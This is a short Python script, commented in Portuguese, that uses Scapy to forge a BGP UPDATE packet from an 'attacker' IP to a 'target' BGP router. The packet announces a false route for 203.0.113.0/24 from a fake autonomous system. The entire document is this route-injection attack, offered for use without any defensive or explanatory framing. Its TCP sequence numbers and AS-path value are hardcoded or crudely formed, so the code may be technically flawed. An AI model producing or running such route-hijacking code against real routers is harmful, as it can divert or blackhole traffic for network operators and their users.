from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.contrib.bgp import BGPHeader, BGPUpdate, BGPPathAttr, BGPNLRI_IPv4

# Configurações do BGP
src_ip = "10.0.0.1"  # IP de origem do atacante
dst_ip = "10.0.0.2"  # IP do roteador BGP alvo
src_port = 179         # Porta de origem BGP
bgp_as = 65001         # Sistema Autônomo falso

# Construção do pacote BGP Update com rota falsa
bgp_update = (
    IP(src=src_ip, dst=dst_ip) /
    TCP(sport=src_port, dport=179, flags="PA", seq=1000, ack=1000) /
    BGPHeader(type=2) /
    BGPUpdate(
        path_attr=[BGPPathAttr(type_flags=0x40, type_code=2, value=bgp_as)],
        nlri=[BGPNLRI_IPv4(prefix="203.0.113.0", prefix_len=24)]
    )
)

# Envio do pacote manipulado
send(bgp_update)

print("Pacote BGP com rota falsa enviado.")
